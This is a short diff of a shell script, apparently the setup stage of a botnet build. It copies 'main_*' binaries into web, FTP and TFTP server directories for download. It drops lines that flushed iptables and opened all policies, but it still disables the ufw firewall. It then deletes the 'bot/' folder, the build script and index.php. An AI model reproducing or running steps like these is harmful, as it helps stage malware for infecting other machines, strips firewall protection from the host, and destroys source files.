@@ -70,11 +70,7 @@ cp release/main_* /var/www/html
 cp release/main_* /var/ftp
 cp release/main_* /var/lib/tftpboot
 
-sudo iptables -F
-sudo iptables -P INPUT ACCEPT
-sudo iptables -P FORWARD ACCEPT
-sudo iptables -P OUTPUT ACCEPT
-sudo service iptables save
+
 sudo ufw disable
 rm -rf bot/ build.sh index.php
 echo "D o n e"
